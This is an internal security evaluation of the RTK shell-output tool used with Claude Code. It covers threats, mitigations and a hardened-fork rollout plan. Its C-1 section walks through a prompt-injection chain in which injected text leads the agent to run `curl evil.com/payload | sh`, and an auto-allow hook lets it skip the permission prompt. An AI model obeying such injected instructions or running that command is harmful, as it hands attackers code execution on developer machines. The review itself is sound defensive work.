# RTK (Rust Token Killer) — Security Evaluation for Acoustic

**Date**: 2026-04-09  
**Evaluator context**: Behavioral Insights team, Claude Code + MCP (MongoDB/Planhat/Zendesk/Slack)  
**RTK version evaluated**: v0.35.0 (released 2026-04-06)  
**Sources**: GitHub repo, SECURITY.md, Issue #640 (community audit), HN threads, Medium post, independent gist evaluation, LinkedIn profiles of maintainers

---

## 1. PROJECT MATURITY ASSESSMENT

### Maintainers
- **Patrick Szymkowiak** (@pszymkowiak) — CEO @ 4urcloud.eu / kexa.io, based in Lille, France. Primary author.
- **Florian Bruniaux** (@FlorianBruniaux) — Ex-VP Engineering, now hands-on. Core contributor and co-maintainer.
- 12+ total contributors as of v0.33.

### Key stats (as of 2026-04-09)
- ~19.5k GitHub stars, 1.1k forks, 632 commits, 96 releases
- Project started ~Jan 2026, so roughly 3 months old
- Bus factor: **2** (two core maintainers — insufficient for production-critical infrastructure)
- License: MIT (README says MIT, badge says MIT, but Apache-2.0 file also exists — worth verifying)
- RTK-Cloud (paid tier, $15/dev/month) announced but not yet launched

### Velocity & maturity concern
96 releases in ~3 months = extremely high churn. Pre-1.0 project with rapid breaking changes. This is alpha-quality software by any enterprise standard.

---

## 2. THREAT ANALYSIS

### CRITICAL — C-1: Shell Injection via `sh -c` (LLM → Shell chain)

**Severity**: 🔴 CRITICAL  
**Source**: Issue #640 audit, confirmed in codebase  
**Status**: ⚠️ Not confirmed fixed as of v0.35.0

`runner.rs` and `summary.rs` pass user-controlled strings directly to `sh -c` without sanitization. The hook auto-allows all rewritten commands (`permissionDecision: "allow"`), creating an **LLM prompt-injection → shell-injection chain**:

1. Attacker crafts a prompt injection in a file Claude reads
2. Claude generates: `cargo test; curl evil.com/payload | sh`
3. RTK hook rewrites to: `rtk test cargo test; curl evil.com/payload | sh`
4. Hook auto-allows (bypasses Claude Code permission prompt)
5. Shell receives the full string via `sh -c`

**Acoustic-specific risk**: With MCP connectors (MongoDB, Planhat, Zendesk), a prompt injection in customer data could chain into shell execution on developer machines.

**Mitigation path**:
- Build from source with a patch that uses `execv`-style argument passing (no shell)
- Strip shell metacharacters (`;`, `|`, `&&`, `||`, backticks, `$()`) from rewritten commands before passing
- OR: Remove the `permissionDecision: "allow"` auto-approve from the hook, forcing Claude Code's native permission prompt
- **Difficulty**: Medium — requires forking and patching `src/runner.rs`
- **If solved**: Threat drops to LOW (RTK becomes a pure output filter, not an execution vector)

### HIGH — H-1: Telemetry with No Install-Time Consent

**Severity**: 🟠 HIGH  
**Source**: Issue #640, confirmed in README  
**Status**: Default opt-out available but telemetry is ON by default

What's sent daily:
- `device_hash` (SHA-256 of hostname + username — stable, linkable per-workstation identifier)
- Top command names (e.g., "git", "cargo", "kubectl")
- Token savings stats
- RTK version, OS, architecture

The telemetry URL is compiled into the binary from GitHub Actions secrets — users cannot inspect the endpoint without disassembly.

**Acoustic-specific risk**: Command name patterns could fingerprint what stack/tools a team uses. The device hash is a persistent tracker.

**Mitigation path**:
- Set `RTK_TELEMETRY_DISABLED=1` in team environment or `~/.config/rtk/config.toml` → `[telemetry] enabled = false`
- Build from source with telemetry code stripped entirely
- **Difficulty**: Easy (env var) / Medium (source patch)
- **If solved**: Threat ELIMINATED

### HIGH — H-2: CI Trust Bypass

**Severity**: 🟠 HIGH  
**Source**: Issue #640  
**Status**: Unknown

Setting `CI=1` + `RTK_TRUST_PROJECT_FILTERS=1` in a repo's Makefile or test fixture bypasses RTK's trust model, auto-loading untrusted `.rtk/filters.toml`.

**Acoustic-specific risk**: A malicious dependency or cloned repo could include a filters.toml that suppresses security warnings or rewrites command output.

**Mitigation path**:
- Don't use `RTK_TRUST_PROJECT_FILTERS` in any Acoustic CI
- Don't use project-local `.rtk/` configs — only global config
- **Difficulty**: Easy (policy, not code)
- **If solved**: Threat drops to LOW

### HIGH — H-3: Global Filters Loaded Without Integrity Check

**Severity**: 🟠 HIGH  
**Source**: Issue #640  
**Status**: Unknown

Project-local `.rtk/filters.toml` requires SHA-256 verification, but `~/.config/rtk/filters.toml` is trusted unconditionally. Compromised global filters can suppress scanner output or rewrite arbitrary command output — particularly dangerous since RTK sits in the LLM's output pipeline.

**Mitigation path**:
- Don't use custom filters (use default RTK behavior only)
- Monitor `~/.config/rtk/filters.toml` for unexpected changes
- **Difficulty**: Easy (policy) / Medium (patch to add integrity checks)
- **If solved**: Threat drops to LOW

### MEDIUM — M-1: Secrets Stored in SQLite Tracking Database

**Severity**: 🟡 MEDIUM  
**Source**: Issue #640  
**Status**: Unknown

The `proxy` command records full commands and arguments to `~/.local/share/rtk/history.db` for 90 days. Commands like `rtk proxy curl -H "Authorization: Bearer sk-abc"` store the bearer token in SQLite.

**Acoustic-specific risk**: AWS credentials, API tokens, or DB connection strings in command arguments would persist on disk.

**Mitigation path**:
- Set tracking database retention to minimum
- Add `proxy` and `curl` to `hooks.exclude_commands` in config
- Exclude sensitive commands from RTK entirely
- Encrypt or restrict permissions on `history.db`
- **Difficulty**: Easy (config) / Medium (source patch for argument scrubbing)
- **If solved**: Threat drops to LOW

### MEDIUM — M-2: Tee Files Save Full Unfiltered Output

**Severity**: 🟡 MEDIUM  
**Source**: README, Issue #640  

On command failure, RTK saves full raw output to `~/.local/share/rtk/tee/*.log`. This output may contain secrets from env vars, stack traces with sensitive data, etc.

**Mitigation path**:
- Set `[tee] enabled = false` or `mode = "never"` in config
- Or `max_files = 0`
- **Difficulty**: Easy (config)
- **If solved**: Threat ELIMINATED

### MEDIUM — M-3: Path Traversal via `RTK_TEE_DIR`

**Severity**: 🟡 MEDIUM  
**Source**: Issue #640  

`RTK_TEE_DIR` env var accepted without canonicalization. Relative paths or `../` sequences could write files to unintended locations.

**Mitigation path**:
- Don't set `RTK_TEE_DIR` (use defaults)
- Build from source and add path validation
- **Difficulty**: Easy (policy) / Low (source patch)

### MEDIUM — M-4: Data Integrity — Silent Output Truncation

**Severity**: 🟡 MEDIUM  
**Source**: Issue #720, Medium article by Pankaj Negi  

RTK can silently drop important context:
- `rtk gh issue view --comments` **silently discards all comments** (the `--comments` flag is ignored in JSON mode)
- Test output compression can hide systemic failures (showing "2 tests failed" without revealing a pattern like "all timeouts")
- Warnings and deprecation notices are stripped, potentially hiding security-relevant info

**Acoustic-specific risk**: Claude Code acting on RTK-filtered output could miss security warnings, important PR comments, or systemic failure patterns in Flink/EKS jobs.

**Mitigation path**:
- Use `rtk proxy <cmd>` for raw passthrough on sensitive operations
- Exclude `gh` from hook rewrites for issue triage workflows
- Add `--comments` to passthrough triggers (pending upstream fix)
- **Difficulty**: Easy (config + awareness)
- **If solved**: Threat drops to LOW

### MEDIUM — M-5: `rtk env -f` Exposes Environment Variables

**Severity**: 🟡 MEDIUM  
**Source**: README  

`rtk env -f AWS` filters and displays env vars. If the LLM asks to inspect the environment, this makes secrets more accessible in compressed form.

**Mitigation path**:
- Add `env` to `hooks.exclude_commands`
- **Difficulty**: Easy
- **If solved**: Threat ELIMINATED

### LOW — Hook Audit Log Grows Unbounded

**Severity**: 🟢 LOW  
**Source**: Issue #640  

When `RTK_HOOK_AUDIT=1` is set, `hook-audit.log` grows without rotation and contains command arguments.

**Mitigation**: Don't enable audit mode in production, or add logrotate config.

### LOW — `curl | sh` Install Method

**Severity**: 🟢 LOW (for Acoustic, because we wouldn't use it)  
**Source**: General practice  

The recommended quick-install (`curl -fsSL ... | sh`) is inherently risky — no signature verification.

**Mitigation**: Build from source or use Homebrew (which has checksum verification). **Never use curl-pipe-sh in an enterprise context.**

---

## 3. WHAT RTK DOES RIGHT

- **Rust binary** — memory safety, no runtime dependencies
- **Formal SECURITY.md** with tiered file risk levels and 2-reviewer requirement for critical files
- **`cargo audit` in CI** — checks for known CVEs in dependencies
- **SHA-256 hook pinning** for project-local filters (though global filters lack this)
- **Conservative dependencies** — clap, serde, regex, rusqlite, no exotic crates
- **Salted device hash** for telemetry (not reversible)
- **`security: default to ask when no permission rule matches`** — shipped in v0.35.0 (2026-04-06), showing active security improvement
- **Hook respects Claude Code deny/ask permission rules** — shipped in v0.33.1
- Allowlist-based command flag validation documented

---

## 4. ACOUSTIC-SPECIFIC RISK MATRIX

| Scenario | Risk Level | RTK Threat Surface |
|---|---|---|
| Developer using Claude Code + RTK on public OSS project | Low | Acceptable with telemetry disabled |
| Developer using Claude Code + RTK on Acoustic codebase (no MCP) | Medium | Shell injection chain is the primary concern |
| Developer using Claude Code + RTK + MCP (MongoDB/Planhat/Zendesk) | **High** | Prompt injection in customer data → shell injection chain; secrets in tracking DB from MCP-adjacent commands |
| RTK deployed in CI/CD pipelines | **High** | CI trust bypass + tracking DB secrets + tee log exposure |
| RTK on shared development servers | **High** | history.db readable by other users, tee logs with secrets |

---

## 5. PRODUCTION READINESS PLAN

### Phase 0: Evaluation (Current — 1 week)

- [ ] Clone repo, audit `src/runner.rs`, `src/summary.rs`, `src/tracking.rs`, `src/telemetry.rs`, and hook files
- [ ] Verify whether C-1 (shell injection) has been addressed in v0.35.0 commits
- [ ] Run `cargo audit` on current codebase
- [ ] Map all network calls in the binary (telemetry endpoint, any others)
- [ ] Identify all file-system write locations (history.db, tee logs, audit logs, config files)

### Phase 1: Hardened Fork (2-3 weeks)

**Goal**: Create `acoustic-rtk` fork with security patches.

| Patch | Priority | Effort |
|---|---|---|
| Strip or disable telemetry at build time | P0 | 1 day |
| Replace `sh -c` in runner.rs/summary.rs with execv-style execution | P0 | 2-3 days |
| Remove `permissionDecision: "allow"` auto-approve from hook — use "ask" or respect Claude Code native permissions | P0 | 1 day |
| Add argument scrubbing to tracking.rs (strip tokens/secrets before storing) | P1 | 1-2 days |
| Disable tee by default in our build | P1 | 0.5 days |
| Add SHA-256 integrity check to global filters.toml | P2 | 1 day |
| Add path validation to RTK_TEE_DIR | P2 | 0.5 days |
| Add `env`, `proxy`, `curl` to default exclude_commands | P1 | 0.5 days |

### Phase 2: Testing (1-2 weeks)

| Test | Method |
|---|---|
| Shell injection via metacharacters | Craft commands with `;`, `|`, `&&`, `$(...)` and verify they're blocked or handled safely |
| Telemetry verification | tcpdump/Wireshark during RTK usage — confirm zero outbound traffic |
| Secrets in tracking DB | Run commands with auth headers, inspect history.db for leaked tokens |
| Tee file contents | Trigger failures, inspect tee logs for sensitive data |
| MCP interaction | Run RTK with Claude Code + MCP connectors, verify hook doesn't intercept MCP-related calls |
| Output integrity | Compare RTK-filtered vs raw output on Acoustic-relevant commands (kubectl, aws, docker) — flag any data loss that would mislead the LLM |
| Permission model | Verify that the hook doesn't auto-allow dangerous commands |
| Prompt injection chain | Embed a malicious instruction in a test file, have Claude read it, and verify RTK doesn't execute injected commands |

### Phase 3: Controlled Rollout (1-2 weeks)

- Deploy to 1-2 developers on non-sensitive projects first
- Monitor for 1 week with audit logging enabled
- Collect token savings metrics to validate ROI
- Expand to team only if Phase 2 tests all pass

### Phase 4: Ongoing Maintenance

- Pin to specific RTK commit hash (don't auto-update)
- Review upstream changes before merging into fork (especially runner.rs, tracking.rs, hooks/)
- Re-audit quarterly or on major version bumps
- Monitor Issue #640 and related security discussions for upstream fixes

---

## 6. VERDICT

**RTK is a legitimate and clever tool with real token savings (60-90% verified by community).** The core concept is sound, the Rust codebase is clean, and the maintainers are identifiable professionals with real track records.

However, **RTK occupies the most privileged position possible in a developer's toolchain** — it's a transparent MITM on every shell command, with auto-approve permissions, that filters what the LLM sees. For Acoustic, with MCP connectors carrying customer data, the C-1 shell injection chain is a genuine enterprise risk.

| Decision | Recommendation |
|---|---|
| Personal use on side projects | ✅ Go ahead (disable telemetry) |
| Acoustic non-sensitive repos | ⚠️ Only after Phase 1 patches |
| Acoustic production codebases with MCP | ❌ Not until Phase 2 testing complete |
| Acoustic CI/CD | ❌ Not recommended without significant hardening |

**Bottom line**: The 2-3 week investment in a hardened fork is worth it — the token savings are real and meaningful for Claude Code heavy usage. But deploying the upstream binary as-is on Acoustic infrastructure is a risk the team shouldn't take.

---

## 7. SOURCES

| Source | URL | Value |
|---|---|---|
| GitHub repo (v0.35.0) | https://github.com/rtk-ai/rtk | Primary source, README, SECURITY.md |
| Issue #640 — Full security audit | https://github.com/rtk-ai/rtk/issues/640 | **Key source** — detailed codebase-level audit with line references |
| Issue #720 — Silent comment dropping | https://github.com/rtk-ai/rtk/issues/720 | Data integrity concern |
| v0.35.0 release notes | https://github.com/rtk-ai/rtk/releases/tag/v0.35.0 | Shows security fix: "default to ask when no permission rule matches" |
| ruflow evaluation gist | https://gist.github.com/michaeloboyle/b31f3bfed270ff0bd13d5b368a054e98 | Independent evaluation noting bus factor, MITM position |
| Medium — "AI Agent Getting Blind" | https://pankajads.medium.com/your-ai-agent-is-getting-smarter-but-also-blind-a-story-about-rtk-6ba4c6ccf97b | Real-world data integrity failure case |
| HN Show thread | https://news.ycombinator.com/item?id=46974740 | Community reception, usage stats |
| Maintainer profiles | LinkedIn (Patrick Szymkowiak, Florian Bruniaux) | Identity verification — real professionals |
